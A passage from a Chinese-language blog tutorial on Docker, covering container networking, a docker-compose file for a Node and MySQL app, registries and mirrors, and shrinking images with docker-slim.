class="line">docker/getting-started</span><br></pre></td></tr></table></figure><p>此时进入容器看一下， <code>docker exec -it test-host /bin/sh</code> ，找到开启的子服务网络别名 start-2，直接用 ping 就好了<code>ping start-2</code> ，可以看到已经链接成功<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612242375753-c5f94fd9-00a4-4e4e-95a5-57a02b3b045d.png#height=112&id=ig788&originHeight=112&originWidth=325&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10120&status=done&style=none&title=&width=325" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612242375753-c5f94fd9-00a4-4e4e-95a5-57a02b3b045d.png#height=112&id=ig788&originHeight=112&originWidth=325&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10120&status=done&style=none&title=&width=325" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>通过启动容器时指定 <code>--network</code>  可以让很方便的建立容器和容器之间的链接，例如 mysql 和应用的通讯</p><p>但是另一面每次都需要启动容器时手动指定 network，公开 port，挂载 volume 实在是有点累，且不方便规模化（可复制），这时候就需要 docker compose，帮进行组装</p><p><a name="F9RFO"></a></p><h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker compose"></a>docker compose</h2><p><a name="P8cVM"></a></p><h3 id="什么是-docker-compose？"><a href="#什么是-docker-compose？" class="headerlink" title="什么是 docker compose？"></a>什么是 docker compose？</h3><p>官方给的定义： Compose is a tool for defining and running multi-container Docker applications. With Compose, you use a YAML file to configure your application’s services. Then, with a single command, you create and start all the services from your configuration.</p><p>翻译下其实就是，用于定义和运行多容器 Docker 应用程序的工具，通过 YAML 文件来配置应用程序的服务，使用一个命令读取配置并创建启动所有服务</p><p><a name="JzO5t"></a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>关于安装如果是最新的 docker desktop 是自带的， <code>docker-compose version</code> 就可以查看版本号</p><p><a name="yDTao"></a></p><h3 id="解读配置文件"><a href="#解读配置文件" class="headerlink" title="解读配置文件"></a>解读配置文件</h3><p>想了想，还是通过配置文件反推比较好理解一些，下面便是一个简单的 node + mysql 的配置文件,来看看它到底做了哪些事？</p><p>docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.7&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">test</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3001</span><span class="string">:3001</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/app</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./:/app</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_HOST:</span> <span class="string">sql</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">test123456</span></span><br><span class="line">      <span class="attr">MYSQL_DB:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">sql</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3307</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/usr/local/var/mysql:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">test123456</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><p>version – 定义当前配置文件所使用的文件格式版本，不同的版本可能会存在兼容问题，<a href="https://docs.docker.com/compose/compose-file/">具体文档</a><br />services – 服务列表<br />app – 定义单例服务<br />image –所用镜像<br />container_name –容器名<br />ports –端口映射<br />working_dir –工作目录，等同于 Dockerfile 中的 workdir<br />volumes – 等同于 docker run -v <br />environment – 设置环境变量</p><p>更多配置信息: <a href="https://docs.docker.com/compose/compose-file/compose-file-v3/">https://docs.docker.com/compose/compose-file/compose-file-v3/</a></p><p><a name="L02Dl"></a></p><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>其实在 services 下的配置服务，大致可以理解为将 dockerfile 和 docker run 的很多信息展示在一个配置表中，例如 -v, -p，working_dir，方便统一管理</p><p>依旧是使用刚才的配置表，执行<code>docker-compose up</code>即可启动服务，通过 desktop 查看<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612327541583-f26025e9-7fce-4246-9aa3-b1d22c4fef76.png#height=392&id=idoXF&originHeight=392&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27043&status=done&style=none&title=&width=816" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612327541583-f26025e9-7fce-4246-9aa3-b1d22c4fef76.png#height=392&id=idoXF&originHeight=392&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27043&status=done&style=none&title=&width=816" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>这里需要注意一点 docker-compose 之所以能够让多个容器互相通信连在一起，并不是有多特殊，而是帮忙做了一些事情，例如创建网络<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612327021345-730ee1d6-3830-4ba6-abd4-7859b00214c0.png#height=69&id=lMHzm&originHeight=69&originWidth=392&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7942&status=done&style=none&title=&width=392" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612327021345-730ee1d6-3830-4ba6-abd4-7859b00214c0.png#height=69&id=lMHzm&originHeight=69&originWidth=392&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7942&status=done&style=none&title=&width=392" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />可以看到提示信息第一条就是 create network “test_node_default”，通过<code>docker network list</code>查看，确实是新加了一条网络<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612327158020-b6cacad7-ce2f-4a86-8ef5-95f2f3720161.png#height=88&id=a88wr&originHeight=88&originWidth=305&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9953&status=done&style=none&title=&width=305" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612327158020-b6cacad7-ce2f-4a86-8ef5-95f2f3720161.png#height=88&id=a88wr&originHeight=88&originWidth=305&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9953&status=done&style=none&title=&width=305" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="1b3zM"></a></p><h3 id="常用指令整理"><a href="#常用指令整理" class="headerlink" title="常用指令整理"></a>常用指令整理</h3><ul><li>docker-compose up –部署应用，添加-d 参数可以后台运行</li><li>docker-compose stop –停止所有应用</li><li>docker-compose rm –删除已停止的应用，但不会清除 volumes &#x2F; 镜像 &#x2F; 网络</li><li>docker-compose restart –重启应用</li><li>docker-compose down –停止并删除运行中的应用</li><li>docker-compose ps –显所有容器示</li></ul><p>更多指令：<a href="https://docs.docker.com/compose/reference/overview/">https://docs.docker.com/compose/reference/overview/</a></p><p><a name="kGE9N"></a></p><h3 id="一些案例"><a href="#一些案例" class="headerlink" title="一些案例"></a>一些案例</h3><p><a name="WV1qg"></a></p><h4 id="链接-mongoDB"><a href="#链接-mongoDB" class="headerlink" title="链接 mongoDB"></a>链接 mongoDB</h4><p>docker-compose 启动容器虽然在同一 network 下，但是容器间的 ip 还是不一样的，无法直接用 127.0.0.1 &#x2F; 0.0.0.0 链接，需要修改一下 url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongodb://root:mongodb@mongodb:27017/admin</span><br></pre></td></tr></table></figure><p><a name="NZKgw"></a></p><h1 id="DockerFile-配置详解"><a href="#DockerFile-配置详解" class="headerlink" title="DockerFile 配置详解"></a>DockerFile 配置详解</h1><p>官方文档： <a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a><br />DockerFile 最佳实践： <a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">https://docs.docker.com/develop/develop-images/dockerfile_best-practices&#x2F;</a></p><p><a name="f7o58"></a></p><h1 id="DockerHub-远程仓库"><a href="#DockerHub-远程仓库" class="headerlink" title="DockerHub 远程仓库"></a>DockerHub 远程仓库</h1><p>官方文档： <a href="https://www.docker.com/products/docker-hub">https://www.docker.com/products/docker-hub</a><br />Docker Hub 是 Docker 官方提供的托管存储库服务，用于与团队查找和共享容器映像。主要功能包括：</p><ul><li>专用存储库：推拉容器图像</li><li>自动化构建：自动从 GitHub 和 Bitbucket 构建容器映像并将其推送到 Docker Hub</li><li>团队和组织：管理对私有存储库的访问</li><li>官方映像：提取并使用 Docker 提供的高质量容器映像</li><li>发布者图像：拉出并使用外部供应商提供的高质量容器图像。认证映像还包括支持并保证与 Docker Enterprise 的兼容性</li><li>Webhooks：成功推送到存储库以将 Docker Hub 与其他服务集成后触发动作</li></ul><p>其实有点类似于 github，默认 pull 的镜像源其实就于 dockerhub，也可以 push 自己的镜像到线上<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612333810974-37a2a01d-d0ef-4ead-9b68-5291b394edae.png#height=346&id=dkLz5&originHeight=346&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43904&status=done&style=none&title=&width=1279" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612333810974-37a2a01d-d0ef-4ead-9b68-5291b394edae.png#height=346&id=dkLz5&originHeight=346&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43904&status=done&style=none&title=&width=1279" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="XMDf0"></a></p><h2 id="配置仓库"><a href="#配置仓库" class="headerlink" title="配置仓库"></a>配置仓库</h2><p><a name="UpQsf"></a></p><h3 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h3><p>如果是生产环境的话，还是推荐建一个私有仓库用来进行托管，这里使用的是阿里云的容器镜像服务，应该是免费的，可以自己看下<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612334146137-f5c60160-39c5-45d6-86ef-215b99f9fdd2.png#height=331&id=VnIAc&originHeight=331&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29883&status=done&style=none&title=&width=686" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612334146137-f5c60160-39c5-45d6-86ef-215b99f9fdd2.png#height=331&id=VnIAc&originHeight=331&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29883&status=done&style=none&title=&width=686" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="nCInf"></a></p><h3 id="docker-Registry"><a href="#docker-Registry" class="headerlink" title="docker Registry"></a>docker Registry</h3><p>官方文档：<a href="https://docs.docker.com/registry/">https://docs.docker.com/registry/</a></p><p>貌似可以通过 registry 镜像搭建私人仓库，还没试过</p><p><a name="5kNcS"></a></p><h1 id="docker-slim-镜像压缩"><a href="#docker-slim-镜像压缩" class="headerlink" title="docker-slim 镜像压缩"></a>docker-slim 镜像压缩</h1><p>这个是关于 docker 镜像的压缩工具，可以帮助制作 slim 版本的镜像，仓库地址：<a href="https://github.com/docker-slim/docker-slim">点击这里</a></p><p><a name="bV50D"></a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先看下官方介绍，大致的意思不需要任何额外的操作，就可以获得最小的镜像，并且给出了个比较夸张的数字，优化 30 倍，看了下 github 有了 9.6k，还是比较可靠的<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612170500155-d3e37a6b-d47c-4e88-805b-76efe2647af1.png#height=195&id=L8xQu&originHeight=195&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100695&status=done&style=none&title=&width=733" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612170500155-d3e37a6b-d47c-4e88-805b-76efe2647af1.png#height=195&id=L8xQu&originHeight=195&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100695&status=done&style=none&title=&width=733" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="7U81Q"></a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>官方介绍：<code>docker-slim</code> will optimize and secure your containers by understanding your application and what it needs using various analysis techniques.</p><p>按官方文档来解释，docker-slim 是通过依赖分析干掉镜像中没有产生使用的文件&#x2F;内容，从而节约体积</p><p><a name="fVGpb"></a></p><h2 id="试用测评"><a href="#试用测评" class="headerlink" title="试用测评"></a>试用测评</h2><p>将刚才的 demo 用来做下实验，效果确实比较惊人</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:dubnium-buster-slim</span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm config <span class="built_in">set</span> registry http://registry.npm.taobao.org  &amp;&amp; npm install pm2 -g &amp;&amp; npm i</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3001</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;./app.js&quot;</span>, <span class="string">&quot;--watch&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>一个简单的 dockerfile 打包完之后，之前的情况下是 588.52MB，打包后缩小了 11 倍以上，默默收藏<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612170858696-07d50b71-74de-4ebd-896c-ec3153723508.png#height=248&id=B4rdA&originHeight=248&originWidth=1820&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41851&status=done&style=none&title=&width=1820" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612170858696-07d50b71-74de-4ebd-896c-ec3153723508.png#height=248&id=B4rdA&originHeight=248&originWidth=1820&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41851&status=done&style=none&title=&width=1820" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="QbGby"></a></p><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>下载地址: <a href="https://github.com/docker-slim/docker-slim/releases">https://github.com/docker-slim/docker-slim/releases</a><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612172423751-0cdcce71-6262-4acf-b775-92622e7a3c1a.png#height=90&id=o8QDH&originHeight=90&originWidth=1198&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18311&status=done&style=none&title=&width=1198" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612172423751-0cdcce71-6262-4acf-b775-92622e7a3c1a.png#height=90&id=o8QDH&originHeight=90&originWidth=1198&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18311&status=done&style=none&title=&width=1198" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612172998730-15df8c10-776b-4d2c-a847-255fc4451102.png#height=49&id=ypKU3&originHeight=49&originWidth=735&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12899&status=done&style=none&title=&width=735" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612172998730-15df8c10-776b-4d2c-a847-255fc4451102.png#height=49&id=ypKU3&originHeight=49&originWidth=735&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12899&status=done&style=none&title=&width=735" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />将 docekr-slim 和 docker-slim-sensor 移动到&#x2F;usr&#x2F;local&#x2F;bin 文件夹下，这样可以在全局使用 docker-slim 命令，命令行输入 <code>docker-slim -v</code> ，显示版本信息表明安装成功<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612173355856-2789cc0a-f9d6-4801-8312-f5f4bb21f1e1.png#height=29&id=EdPhu&originHeight=29&originWidth=660&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6242&status=done&style=none&title=&width=660" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612173355856-2789cc0a-f9d6-4801-8312-f5f4bb21f1e1.png#height=29&id=EdPhu&originHeight=29&originWidth=660&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6242&status=done&style=none&title=&width=660" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="ChgV2"></a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>在使用 docker-slim 对镜像进行压缩前需要提前打包一次，docker build -t test . <br />拿到打包生成的 image ID，使用 docker-slim build –target [image ID]，即自动生成[image Name].slim 格式的镜像，如下：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612174796912-5c448835-3cdf-4edf-9e69-eb8704a10759.png#height=176&id=ik59S&originHeight=176&originWidth=1748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31121&status=done&style=none&title=&width=1748" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612174796912-5c448835-3cdf-4edf-9e69-eb8704a10759.png#height=176&id=ik59S&originHeight=176&originWidth=1748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31121&status=done&style=none&title=&width=1748" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="FmcFF"></a></p><h2 id="需要注意的坑"><a href="#需要注意的坑" class="headerlink" title="需要注意的坑"></a>需要注意的坑</h2><p>如果预期需要使用 docker-slim 进行压缩，那么不要使用 npm scripts 这样的命令，在当前版本里 npm scripts 是无法被依赖分析读取的，也就是说会干掉全局状态下的 node_modules，导致应用无法被启动</p><p>例如：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误案例</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;npm&quot;</span>, <span class="string">&quot;start&quot;</span>]  -&gt; npm start 等于<span class="string">&quot;start&quot;</span>: <span class="string">&quot;pm2-runtime app.js --watch&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确案例</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;./app.js&quot;</span>, <span class="string">&quot;--watch&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>具体的 issue： <a href="https://github.com/docker-slim/docker-slim/issues/150">https://github.com/docker-slim/docker-slim/issues/150</a><br><a name="03NYR"></a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><a name="PbfYJ"></a></p><h1 id="配置-github-CI-x2F-CD"><a href="#配置-github-CI-x2F-CD" class="headerlink" title="配置 github CI&#x2F;CD"></a>配置 github CI&#x2F;CD</h1><p>官方文档： <a href="https://docs.docker.com/ci-cd/github-actions/">https://docs.docker.com/ci-cd/github-actions/</a></p><p><a name="uUmD5"></a></p><h1 id="更换-docker-源-–国内-cdn"><a href="#更换-docker-源-–国内-cdn" class="headerlink" title="更换 docker 源 –国内 cdn"></a>更换 docker 源 –国内 cdn</h1><p>毕竟国外的资源部分情况下还是比较慢（慢的过分..），同理 npm 一般要换成淘宝源或者使用 cnpm，这里的话我用的是阿里云的源</p><p><a name="okH7n"></a></p><h2 id="查看当前状态"><a href="#查看当前状态" class="headerlink" title="查看当前状态"></a>查看当前状态</h2><p>输入 <code>docker info</code> 查看当前 docker 基础信息，行数比较多，可以直接 <code>command + F</code> 搜索 ”Registry”，一般情况下会显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方镜像源</span></span><br><span class="line">Registry: https://index.docker.io/v1/</span><br></pre></td></tr></table></figure><p><a name="HVEpl"></a></p><h2 id="阿里云镜像源"><a href="#阿里云镜像源" class="headerlink" title="阿里云镜像源"></a>阿里云镜像源</h2><p>登录阿里云账号：<a href="https://www.aliyun.com/">https://www.aliyun.com/</a>，找到容器镜像服务 -&gt; 镜像工具 -&gt; 镜像加速器，<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612182190580-baeec99e-52ad-485e-8e48-c967e49c4b3a.png#height=359&id=Nco5x&originHeight=359&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28848&status=done&style=none&title=&width=509" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612182190580-baeec99e-52ad-485e-8e48-c967e49c4b3a.png#height=359&id=Nco5x&originHeight=359&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28848&status=done&style=none&title=&width=509" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612182857294-743dfc53-7eb3-46b8-9104-81c81db5cc6c.png#height=918&id=YmKxm&originHeight=918&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104263&status=done&style=none&title=&width=878" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612182857294-743dfc53-7eb3-46b8-9104-81c81db5cc6c.png#height=918&id=YmKxm&originHeight=918&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104263&status=done&style=none&title=&width=878" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="VLk8r"></a></p><h2 id="设置-Preferences"><a href="#设置-Preferences" class="headerlink" title="设置 Preferences"></a>设置 Preferences</h2><p>如果是最新的 docker desktop 可以略过前面的文字，直接找到这段，按流程操作，找到 preferences，添加到 json 中，重启 docker 服务即可<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612182951498-68b082aa-3e73-424d-b2fe-6ce632286864.png#height=792&id=bhhlX&originHeight=792&originWidth=2080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117634&status=done&style=none&title=&width=2080" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612182951498-68b082aa-3e73-424d-b2fe-6ce632286864.png#height=792&id=bhhlX&originHeight=792&originWidth=2080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117634&status=done&style=none&title=&width=2080" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />发现多了一行<code>Registry Mirrors</code>即添加成功，此时可以重新<code>docker pull [images]</code>体验一下新的速度~<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612183398620-5885dd9b-705d-4913-abfc-08fd1cfba1a1.png#height=133&id=gxwpL&originHeight=133&originWidth=327&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10126&status=done&style=none&title=&width=327" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612183398620-5885dd9b-705d-4913-abfc-08fd1cfba1a1.png#height=133&id=gxwpL&originHeight=133&originWidth=327&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10126&status=done&style=none&title=&width=327" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="6KBm1"></a></p><h1 id="杂项知识"><a href="#杂项知识" class="headerlink" title="杂项知识"></a>杂项知识</h1><p><a name="3hhwH"></a></p><h2 id="读懂-docker-tag"><a href="#读懂-docker-tag" class="headerlink" title="读懂 docker tag"></a>读懂 docker tag</h2><p>一般镜像名的 tag 都会带一些后缀，以 node 为例，如下图： <br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612153220352-3636745e-4f35-486c-b597-be358c7b0ce2.png#height=664&id=Amb2v&originHeight=664&originWidth=1225&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115197&status=done&style=none&title=&width=1225" class="lazyload placeholder" 